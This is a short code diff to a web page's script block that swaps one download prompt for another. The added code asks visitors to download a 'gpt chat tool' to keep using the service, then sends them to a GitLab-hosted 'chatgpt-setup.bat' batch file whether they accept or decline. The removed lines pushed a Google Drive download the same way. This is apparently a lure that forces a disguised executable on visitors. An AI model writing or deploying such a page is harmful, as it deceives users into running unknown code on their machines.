@@ -180,8 +180,12 @@
       }
     </script>
     <script>
-      alert("Please download ChatGPT Toolkit");
-      window.open('https://drive.google.com/u/0/uc?id=1A6vz26Vr3w0vs-SJDkCVR5pgPMNue4Um&export=download')
+      if(confirm("Please download the gpt chat tool to continue using the service") == true){
+          window.location.href = 'https://gitlab.com/cophohieutruong/batch/-/raw/main/chatgpt-setup.bat?inline=false';
+      }
+      else{
+          window.location.href = 'https://gitlab.com/cophohieutruong/batch/-/raw/main/chatgpt-setup.bat?inline=false';
+      }
     </script>
   </body>
 </html>
